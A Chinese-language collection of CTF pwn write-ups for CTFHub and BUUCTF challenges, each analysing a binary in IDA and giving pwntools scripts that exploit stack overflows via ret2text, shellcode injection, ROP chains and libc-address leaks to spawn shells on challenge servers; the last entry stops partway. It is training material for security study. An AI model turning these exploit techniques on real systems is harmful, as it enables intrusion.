# Pwn

## CTFHub

### ret2text

先`file ./ret2text`查看文件类型再`checksec --file=./ret2text`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/1.png)

用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v4`中，`v4`的长度只有`0x70`，即可用栈大小只有`112`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/2.png)

双击`v4`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x70`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/3.png)

在`Function Window`中注意到有一个名为`secure()`的函数，函数中当`scanf()`输入的`v2`变量和`rand()`函数生成的`v3`变量值相等时，会发生系统调用，因此构造`payload`时需要再加上`system('/bin/sh')`函数的地址即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/4.png)

编写`Python`代码即可得到`ctfhub{f878895b3600b2e2192e5c9a}`。

```python
from pwn import *

io = remote('challenge-e20ddfc12b209019.sandbox.ctfhub.com', 34749)
payload = b'a'*0x70 + b'fuckpwn!' + p64(0x4007B8)
io.sendlineafter('Welcome to CTFHub ret2text.Input someting:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/5.png)

提交`ctfhub{f878895b3600b2e2192e5c9a}`即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2text/6.png)

------

### ret2shellcode

先`file ./ret2shellcode`查看文件类型再`checksec --file=./ret2shellcode`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/1.png)

用`IDA Pro 64bit`打开附件`ret2shellcode`，按`F5`反汇编源码并查看主函数，发现`buf`变量的地址被`printf()`函数输出了，然后`read()`函数读取输入到变量`buf`中，`char`型变量`buf`的长度只有`0x10`，即可用栈大小只有`10`字节，但是`read()`函数限制输入`0x400`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/2.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/3.png)

由于`checksec`时发现`NX disabled`，即程序没有开`NX`保护，栈的数据段可以执行。虽然程序中并没有`system()`函数和`/bin/sh`，但是`buf`变量的栈地址被`printf()`函数泄露出来了，因此可以尝试让程序跳转到我们构造的`shellcode`中，并在栈溢出后返回到栈的数据段上执行，就能得到`shell`权限了。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process('ret2shellcode')
io = remote('challenge-90f37d9c89a2800a.sandbox.ctfhub.com', 33884)
io.recvuntil(b'[')
buf_address = int(io.recvuntil(b']')[:-1].decode('utf-8'), 16)
log.success('buf_address => %s' % hex(buf_address).upper())
shellcode_address = buf_address+0x20 # buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8
log.success('buf_address => %s' % hex(shellcode_address).upper())
shellcode = asm(shellcraft.sh())
payload = b'a'*0x10 + b'fuckpwn!' + p64(shellcode_address) + shellcode
io.recv()
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/4.png)

`ls`可以看到有个`flag`文件，`cat flag`拿到`ctfhub{f878895b3600b2e2192e5c9a}`提交即可。

![](https://paper.tanyaodan.com/CTFHub/Pwn/栈溢出/ret2shellcode/5.png)

------

## BUUCTF

### [test_your_nc](https://buuoj.cn/challenges#test_your_nc)

这题亏我还先`file ./test`查看文件类型再`checksec --file=test`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/test_your_nc/1.png)

结果输入以下代码就能拿到`flag{24c4fb91-44b7-4a4f-8f30-895875efacd7}`。

```bash
nc node4.buuoj.cn 27841 #使用nc连接node4.buuoj.cn的监听端口27841
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

------

### [others_shellcode](https://buuoj.cn/challenges#others_shellcode)

先`file ./other_shellcode`查看文件类型再`checksec --file=./other_shellcode`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/1.png)

在本地尝试运行一下这个程序，好家伙发现这直接执行了`shell`，尝试输入`cat flag`就拿到本地生成的`flag`啦。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/2.png)

用`IDA Pro 32bit`打开附件`shell_asm`后按`F5`反汇编源码并查看主函数，发现有个`getShell()`函数很可疑。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/3.png)

双击`getShell()`函数查看详情，发现程序将字符串`/bin//sh`赋值给了`char`型数组`v1`，并把`int`型变量`result`赋值为`11`，但是这都不是重点，重点是`__asm {int 80h}`这行代码，它在`C`语言里嵌入了汇编语言，并且用`int 80h`进行系统调用`shell`。

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/4.png)

编写`Python`代码连接`node4.buuoj.cn`的监听端口`28021`，发送`cat flag`即可得到`flag{12aab39b-9d20-4f50-a9a8-b52320ed3771}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 28021)
io.sendline(b'cat flag')
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/others_shellcode/5.png)

------

### [rip](https://buuoj.cn/challenges#rip)

先`file ./pwn1`查看文件类型再`checksec --file=pwn1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/rip/1.png)

用`IDA Pro 64bit`打开`pwn1`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`s`中，`s`的长度只有`0xf`，即可用栈大小只有`15`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/rip/2.png)

在`Functions window`可以看到有一个`fun()`函数：

![](https://paper.tanyaodan.com/BUUCTF/rip/3.png)

按`F5`反汇编可以看到这是一个系统调用，且`fun()`函数的起始地址为`0x401186`。

![](https://paper.tanyaodan.com/BUUCTF/rip/4.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`28531`，并发送`payload`：

```python
from pwn import *
# remote()建立远程连接,指明ip和port
io = remote('node4.buuoj.cn', 28531)
payload = b'a'*(0xf + 0x8) + p64(0x40118A)
io.sendline(payload) #发送数据
io.interactive() #与shell进行交互
```

与`shell`交互时输入以下命令行即可得到`flag{c706d420-68bf-4b75-9468-97997d4817b6}`。

```bash
ls #这步可以看到当前目录下有个flag文件
cat flag #直接输出flag即可
```

![](https://paper.tanyaodan.com/BUUCTF/rip/5.png)

------

### [warmup_csaw_2016](https://buuoj.cn/challenges#warmup_csaw_2016)

先`file ./warmup_csaw_2016`查看文件类型再`checksec --file=warmup_csaw_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/1.png)

用`IDA Pro 64bit`打开`warmup_csaw_2016`后按`F5`反汇编源码并查看主函数，发现`gets()`函数读取输入到变量`v5`中，`v5`的长度只有`0x40`，即可用栈大小只有`64`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/2.png)

在`Functions window`可以看到有一个`sub_40060D()`函数，按`F5`反汇编可以看到这是一个系统调用，且`sub_40060D()`函数的起始地址为`0x40060D`。

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/3.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25282`，发送`payload`即可得到`flag{31eb59d1-1c21-4440-96a5-b12276f75a41}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25282)
payload = b'a'*(0x40 + 0x8) + p64(0x40060D)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/warmup_csaw_2016/4.png)

------

### [ciscn_2019_n_1](https://buuoj.cn/challenges#ciscn_2019_n_1)

先`file ./ciscn_2019_n_1`查看文件类型再`checksec --file=ciscn_2019_n_1`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/1.png)

用`IDA Pro 64bit`打开`ciscn_2019_n_1`后按`F5`反汇编源码并查看主函数，发现`fun()`函数最可疑。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/2.png)

双击`func()`函数查看源码可以看到当`v2 = 11.28125`时会有一个系统调用。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/3.png)

查看汇编代码双击`cs:dword_4007F4`可以看到`11.28125`在内存中的`16`进制表示为`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/4.png)

查看栈结构，此处`var_30`是`v1`，而`var_4`是`v2`，需要`(0x30-0x04)=44`个字节就能让栈溢出，最后再填入`11.28125`对应的十六进制数`0x41348000`。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/5.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25860`，发送`payload`即可得到`flag{42086316-01d7-47ee-bfaa-00861bbe8222}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25860)
payload = b'a'*(0x30 - 0x4) + p64(0x41348000)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_1/6.png)

------

### [ciscn_2019_n_8](https://buuoj.cn/challenges#ciscn_2019_n_8)

先`file ./ciscn_2019_n_8`查看文件类型再`checksec --file=./ciscn_2019_n_8`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/1.png)

用`IDA Pro 32bit`打开`ciscn_2019_n_8`后按`F5`反汇编，可以看到主函数源码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL )  //当var[13]的值等于0x11即17就能系统调用/bin/sh
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

构造`payload`时直接通过数组赋值用`13*4`个字节占满`var[0]`至`var[12]`，再把`var[13]`赋值为`0x11`，即可系统调用`/bin/sh`。

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`29508`，发送`payload`即可得到`flag{f02dd738-d5ec-4e09-9b7f-68cf73aae00c}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 29508)
payload = b'a'*13*4 + p32(0x11)
io.sendlineafter(b'What\'s your name?\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_n_8/2.png)

------

### [pwn1_sctf_2016](https://buuoj.cn/challenges#pwn1_sctf_2016)

先`file ./pwn1_sctf_2016`查看文件类型再`checksec --file=pwn1_sctf_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/1.png)

用`IDA Pro 32bit`打开`pwn1_sctf_2016`后按`F5`反汇编源码并查看主函数，发现`vuln()`函数。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/2.png)

双击`vuln()`函数查看源码，分析后发现`fgets()`函数限制输入`32`个字节到变量`s`中，乍一看并没有超出可用栈大小。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/3.png)

再按一次`F5`后发现第`19`行的`replace()`函数会把输入的`I`替换成`you`，`1`个字符变成`3`个字符，并且在第`27`行会对原来的`s`变量重新赋值。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/4.png)

在`Functions window`可以看到有一个`get_flag()`函数，按`F5`反汇编可以看到这是一个系统调用，且`get_flag()`函数的起始地址为`0x8048F0D`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/5.png)

查看栈结构发现`s`的长度为`0x3c`，即`60`个字节，而输入被限制在`32`个字节内，每个`I`可以被替换成`you`，所以输入`60÷3=20`个`I`就能让栈溢出，然后`db 4 dup(?)` 还需要占用`4`个字节的内存，最后加上`get_flag()`函数的起始地址`0x8048F0D`构成`payload`。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/6.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`26333`，发送`payload`即可得到`flag{efb5872f-b8d0-4892-9ed3-ea71e8a7a983}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 26333)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x4 + p32(address)
# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/7.png)

------

### [jarvisoj_level0](https://buuoj.cn/challenges#jarvisoj_level0)

先`file ./level0`查看文件类型再`checksec --file=level0`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/1.png)

用`IDA Pro 64bit`打开`level0`后按`F5`反汇编源码并查看主函数，发现问题的关键在于`vulnerable_function()`函数。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/2.png)

双击`vulnerable_function()`函数可以看到`buf`的长度只有`0x80`，即可用栈大小只有`108`字节，但是`read()`并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/3.png)

在`Functions window`可以看到有一个`callsystem()`函数，按`F5`反汇编可以看到这是一个系统调用，且`callsystem()`函数的起始地址为`0x400596`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/4.png)

编写`Python`脚本连接`node4.buuoj.cn`的监听端口`25719`，`buf`需覆盖`0x80`个字节覆盖，再加上`rbp`的`0x8`个字节，最后加上`callsystem()`函数的起始地址`0x400596`构成`payload`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25719)
e = ELF('level0')
address = e.symbols['callsystem']
log.success('callsystem_address => {}'.format(hex(address).upper()))
payload = b'a'*(0x80 + 0x8) + p64(address)
# payload = b'a'*(0x80 + 0x8) + p64(0x400596)
io.sendline(payload)
io.interactive()
```

发送`payload`监听成功后`ls`查看文件目录再`cat flag`即可得到`flag{af006b52-6eb0-4df4-9706-dcbb4dc8cff2}`。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_level0/5.png)

------

### [[HarekazeCTF2019]baby_rop](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)

先`file ./HarekazeCTF2019_babyrop1`查看文件类型再`checksec --file=./HarekazeCTF2019_babyrop1`检查文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/1.png) 

用`IDA Pro 64bit`打开附件`HarekazeCTF2019_babyrop1`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`v4`，`v4`的可用栈大小为`0x10`，`scanf()`函数读取输入到`v4`变量时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/2.png)

双击`v4`变量查看其在当前函数栈帧的详情，构造`payload`时可以用`0x10`个字节占满变量`v4`，再用`0x8`个字节覆盖到栈帧。

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/3.png)

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`的地址。

```bash
ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/4.png)

在`Function window`中存在`system()`函数的地址，我们也可以通过`ELF`模块的`symbols['system']`来获取`system()`函数的地址。字符串`/bin/sh`的地址可以通过`ROPgadget`获取。

```bash
ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/5.png)

构造`payload`时向`pop_rdi`寄存器中传入字符串`/bin/sh`的地址，再调用`system`即可完成系统调用，编写`Python`代码打通靶机获取到目标主机的`shell`后输入`cat /home/babyrop/flag`即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 28730)
e = ELF('./HarekazeCTF2019_babyrop1')
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --only "pop|ret"
pop_rdi = 0x400683
system_address = e.symbols['system'] # 0x400490
# ROPgadget --binary ./HarekazeCTF2019_babyrop1 --string "/bin/sh"
bin_sh_address = 0x601048
payload = b'a'*0x10 + b'fuckpwn!'
payload += flat(pop_rdi, bin_sh_address, system_address)
io.sendlineafter(b'What\'s your name? ', payload)
io.interactive()  # cat /home/babyrop flag
```

![](https://paper.tanyaodan.com/BUUCTF/harekazectf2019_babyrop/6.png)

------

### [HarekazeCTF2019]baby_rop2

先`file ./HarekazeCTF2019_babyrop2`查看文件类型，再`checksec --file=./HarekazeCTF2019_babyrop2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ file ./HarekazeCTF2019_babyrop2
./HarekazeCTF2019_babyrop2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fab931b976ae2ff40aa1f5d1926518a0a31a8fd7, not stripped

┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ checksec --file=./HarekazeCTF2019_babyrop2
[*] '/home/tyd/ctf/pwn/buuctf/HarekazeCTF2019_babyrop2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`HarekazeCTF2019_babyrop2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v5; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("What's your name? ");
  v5 = read(0, buf, 0x100uLL);
  buf[v5 - 1] = 0;
  printf("Welcome to the Pwn World again, %s!\n", buf);
  return 0;
}
```

这题和[**[HarekazeCTF2019]baby_rop**](#[HarekazeCTF2019]baby_rop)的区别就在于，程序中没有现成的`system`和`/bin/sh`可以利用。我们需要利用`printf`函数来计算出`libc`的基地址，以便求出`system`和`/bin/sh`。在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`的地址。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
└─$ ROPgadget --binary ./HarekazeCTF2019_babyrop2 --only "pop|ret"
Gadgets information
============================================================
0x000000000040072c : pop r12 ; pop r13 ; pp r14 ; pop r15 ; ret
0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400730 : pop r14 ; pop r15 ; ret
0x0000000000400732 : pop r15 ; ret
0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005a0 : pop rbp ; ret
0x0000000000400733 : pop rdi ; ret
0x0000000000400731 : pop rsi ; pop r15 ; ret
0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004d1 : ret
0x0000000000400532 : ret 0x200a

Unique gadgets found: 12
```

编写`Python`代码求解，`cat /home/babyrop2/flag`得到`flag{ca63fb55-fa76-4655-994d-6bca048f1748}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27378)
elf = ELF('./HarekazeCTF2019_babyrop2')
main = elf.sym['main']
printf_plt = elf.plt['printf']
read_got = elf.got['read']
rdi_ret = 0x400733 # pop rdi ; ret
offset = 0x20 + 0x8
payload = b'a'*offset + flat(rdi_ret, read_got, printf_plt, main)
io.sendlineafter(b"What's your name? ", payload)
read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.info('read_address => %s', hex(read_addr))
libc = ELF('./libc.so.6')
libcbase = read_addr-libc.sym['read']
log.info('libc_address => %s', hex(libcbase))
system = libcbase + libc.sym['system']
log.info('system_address => %s', hex(system))
bin_sh = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh))
payload = b'a'*offset + p64(rdi_ret) + p64(bin_sh) + p64(system)
io.sendlineafter(b"What's your name? ", payload)
io.interactive() # cat /home/babyrop2/flag
```

看`Write Up`的时候发现有些师傅利用格式化字符串，构造出`printf("%s", read_got)`泄露`read`函数的`got`表地址。`%s`的地址为`0x400770`。`p64(rdi_ret)+p64(format_str)`将`b'a'*offset`造成栈溢出后的返回地址覆盖为`pop_rdi; ret`，`pop_rdi`对应参数为`format_str`，执行后将`format_str`赋值给`rdi`，之后执行`ret`返回指令。`p64(pop_rsi)+p64(read_got)+p64(0)`是上个`ret`要执行的，将`rsi`寄存器的值设置成`read`函数的`got`表地址，用不着`r15`就设置为`0`。`pop_rsi`的`ret`返回到`p64(printf_plt)`，利用`printf`函数输出`read`函数的`got`表地址。在获得`read`函数的`got`表地址后，我们需要用`p64(main)`回到程序开头。

```assembly
.rodata:0000000000400758 ; const char format[]
.rodata:0000000000400758 format          db 'What',27h,'s your name? ',0
.rodata:0000000000400758                                         ; DATA XREF: main+44↑o
.rodata:000000000040076B                 align 10h
.rodata:0000000000400770 ; const char aWelcomeToThePw[]
.rodata:0000000000400770 aWelcomeToThePw db 'Welcome to the Pwn World again, %s!',0Ah,0
.rodata:0000000000400770                                         ; DATA XREF: main+80↑o
.rodata:0000000000400770 _rodata         ends
```

编写`Python`代码求解，`cat /home/babyrop2/flag`得到`flag{ca63fb55-fa76-4655-994d-6bca048f1748}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27378)
elf = ELF('./HarekazeCTF2019_babyrop2')
main = elf.sym['main']
printf_plt = elf.plt['printf']
read_got = elf.got['read']
rdi_ret = 0x400733 # pop rdi ; ret
pop_rsi = 0x400731 # pop rsi ; pop r15 ; ret
format_str = 0x400770
offset = 0x20 + 0x8
payload = b'a'*offset + flat(rdi_ret, format_str, pop_rsi, read_got, 0, printf_plt, main)
io.sendlineafter(b"What's your name? ", payload)
read_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.info('read_address => %s', hex(read_addr))
libc = ELF('./libc.so.6')
libcbase = read_addr-libc.sym['read']
log.info('libc_address => %s', hex(libcbase))
system = libcbase + libc.sym['system']
log.info('system_address => %s', hex(system))
bin_sh = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh))
payload = b'a'*offset + p64(rdi_ret) + p64(bin_sh) + p64(system)
io.sendlineafter(b"What's your name? ", payload)
io.interactive() # cat /home/babyrop2/flag
```

------

### [jarvisoj_tell_me_something](https://buuoj.cn/challenges#jarvisoj_tell_me_something)

先`file ./jarvisoj_tell_me_something`查看文件类型再`checksec --file=./jarvisoj_tell_me_something`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/1.png)

用`IDA Pro 64bit`打开附件`jarvisoj_tell_me_something`，按`F5`反汇编源码并查看主函数，可以看到有个`int`型变量`v4`，`v4`的可用栈大小为`0x88`，`read()`函数读取输入到`v4`变量时限制的字节数为`0x100`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/2.png)

在`Function window`中存在后门函数`good_game()`，这个函数读取了服务器中的`flag.txt`文件并进行输出。

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/3.png)

构造`payload`时只要我们用`0x88`个字节覆盖掉`v4`变量，造成栈溢出漏洞，再将函数栈帧的返回地址覆盖成后门函数`good_game()`的地址就能拿到`flag`啦。编写`Python`代码即可得到`flag{5325d99b-666c-48e3-bd0c-be4fdd6619d4}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29608)
e = ELF('./jarvisoj_tell_me_something')
good_game = e.symbols['good_game']
payload = b'a'*0x88 + p64(good_game)
io.sendlineafter(b'Input your message:\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_tell_me_something/4.png)

------

### [护网杯_2018_gettingstart](https://buuoj.cn/challenges#%E6%8A%A4%E7%BD%91%E6%9D%AF_2018_gettingstart)

先`file ./2018_gettingstart`查看文件类型再`checksec --file=2018_gettingstart`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/1.png)

用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，并不能构成栈溢出。

注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/2.png)

分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/3.png)

`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)

当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)

编写`Python`代码即可得到`flag{5113e012-2d92-4257-bf3a-f688df2841bf}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27036)
# io = process('./2018_gettingStart')
payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
io.sendlineafter(b'But Whether it starts depends on you.\n', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/6.png)

------

### [bjdctf_2020_babystack](https://buuoj.cn/challenges#bjdctf_2020_babystack)

先`file ./bjdctf_2020_babystack`查看文件类型再`checksec --file=bjdctf_2020_babystack`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/1.png)

用`IDA Pro 64bit`打开附件`bjdctf_2020_babystack`，按`F5`反汇编源码并查看主函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x10`，`read()`函数虽然限制了输入到`buf`变量的字节数但是该字节数是由用户输入的`nbytes`变量决定的，当`nbytes`变量是一个足够大的数值时，显然会造成栈溢出。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/2.png)

双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x10`个字节占满`buf`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/3.png)

在`Function Window`中注意到有一个名为`backdoor()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`backdoor()`函数的起始地址即可。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/4.png)

编写`Python`代码即可得到`flag{0e0d405b-c936-45c4-afc4-947afc46b0a3}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('./bjdctf_2020_babystack')
io = remote('node4.buuoj.cn', 29417)
e = ELF('./bjdctf_2020_babystack')
io.sendlineafter(b'Please input the length of your name:', b'100')
backdoor_address = e.symbols['backdoor'] # 0x4006E6
log.success('backdoor_address => %s' % hex(backdoor_address))
payload = b'a'*0x10 + b'fuckpwn!' + p64(backdoor_address)
io.sendlineafter(b'What\'s u name?', payload)
io.interactive()
```

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babystack/5.png)

------

### [bjdctf_2020_babyrop](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

先`file ./bjdctf_2020_babyrop`查看文件类型再`checksec --file=bjdctf_2020_babyrop`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/1.png)

用`IDA Pro 64bit`打开附件`bjdctf_2020_babyrop`，按`F5`反汇编源码并查看主函数，发现`vuln()`函数很可疑。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/2.png)

双击发现`vuln()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x20`，`read()`函数限制输入到`buf`变量的字节数为`0x64`，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/3.png)

